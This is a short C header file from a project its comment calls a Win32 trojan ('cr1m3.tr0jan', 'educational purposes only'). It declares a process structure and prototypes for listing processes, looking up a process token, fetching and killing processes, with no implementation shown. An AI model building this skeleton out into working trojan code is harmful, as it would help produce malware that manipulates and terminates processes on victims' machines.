/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/

#ifndef __PROCESS_H_FILE
#define __PROCESS_H_FILE


typedef struct _proc_struct {
	int id;
	char process[160];
	int procid;

} proc_struct, *pproc_struct;


int __process_list();
int __process_findtoken(unsigned long pid);
int __get_process(pproc_struct pproc,int id);
int __kill_process(int pid);
unsigned long int getStatus(unsigned long int val);

#endif
